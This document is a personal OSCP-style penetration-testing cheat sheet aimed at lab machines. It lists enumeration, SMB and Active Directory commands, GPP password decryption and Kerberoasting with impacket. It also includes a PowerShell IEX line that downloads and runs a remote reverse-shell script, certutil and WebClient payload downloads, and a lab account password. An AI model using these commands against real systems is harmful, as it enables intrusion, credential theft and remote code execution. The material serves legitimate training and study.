# oscpNotes

WEB
davtest
droopescan --> https://github.com/droope/droopescan
ENUMERATION
gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

DNS
dnsrecon -d 10.10.10.100 -r 10.0.0.0/8

WINDOWS


LFI
https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/


SMB
smbmap -u USER -p PASSWORD -d DOMAIN -H ip
# recursively list share contents
smbmap -R dirname -H ip
# download file with certain name
smbmap -R dirname -H ip -A Groups.xml
# list shares with creds
smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100
# decrypt gpp password, cpassword comes from group xml
gpp-decrypt "cpassword"
# Get AD users after having user creds
GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see https://github.com/SecureAuthCorp/impacket/issues/632
# Get user spn # https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names !!! FIX TIME SKEW
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
smbclient -L //10.10.10.100   (enter if password is requested)

SHELLS
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .

ENUMERATION

JAWS --> https://github.com/411Hall/JAWS.git

DOWNLOAD SHELL POWERSHELL

cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/rev1.ps1')  (may need to escape quotes)
AVOID BAD CHARACTERS --> convert to windows file format
iconv -t UTF-16LE | base64-w0 
powershell 64 bit is stored in C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe

DOWNLOAD FILE CMD/PS
certutil -urlcache -split -f http://10.10.10.10/agent.exe C:\\users\\public\\agent.exe #CMD
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.12/1.exe', 'C:/users/merlin/Desktop/1.exe') # PS
Start-BitsTransfer -Source http://10.10.14.12/jp.exe -Destination jp.exe # PS


PRIVESC WINDOWS 
whoami /priv
# if SeImpersonatePrivilege is enabled --> juicy/rotten potato
systeminfo
metasploit local_exploit_suggester --> find vulns
sherlock --> find vulns
MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64


LINUX





USEFULL COMMANDS.ps1
tcpdump -i tun0 icmp
python -m SimpleHTTPServer 80


USEFULL FRAMEWORKS
GIT
nishang --> https://github.com/samratashok/nishang.git
JAWS  --> enumeration https://github.com/411Hall/JAWS.git
impacket --> https://github.com/SecureAuthCorp/impacket.git
webshells --> https://github.com/BlackArch/webshells.git
sherlock --> https://github.com/rasta-mouse/Sherlock
empire --> https://github.com/EmpireProject/Empire.git
unicorn --> https://github.com/trustedsec/unicorn.git
APT
gobuster
mdbtools
seclists

